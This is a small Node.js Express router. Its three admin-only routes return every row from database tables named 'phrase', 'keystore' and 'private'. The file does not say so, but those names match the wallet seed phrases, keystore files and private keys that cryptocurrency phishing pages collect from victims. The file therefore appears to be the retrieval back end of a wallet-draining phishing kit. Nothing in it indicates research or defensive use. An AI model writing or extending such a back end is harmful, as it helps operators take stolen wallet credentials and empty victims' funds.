const express = require('express');
const router = express.Router();
const db = require('../config/db');
const validateAdmin = require('../auth/validateAdmin');

// GET all phrases
router.get('/admin/phrase', validateAdmin, async (req, res) => {
    try {
        const [results] = await db.execute('SELECT * FROM phrase');
        return res.status(200).json(results);
    } catch (error) {
        console.error('Database error:', error);
        return res.status(500).json({ message: 'Server error' });
    }
});

// Get all keystore
router.get('/admin/keystore', validateAdmin, async (req, res) => {
    try {
        const [results] = await db.execute('SELECT * FROM keystore');
        return res.status(200).json(results);
    } catch (error) {
        console.error('Database error:', error);
        return res.status(500).json({ message: 'Server error' });
    }
});

// get all private
router.get('/admin/private', validateAdmin, async (req, res) => {
    try {
        const [results] = await db.execute('SELECT * FROM private');
        return res.status(200).json(results);
    } catch (error) {
        console.error('Database error:', error);
        return res.status(500).json({ message: 'Server error' });
    }
});

module.exports = router;
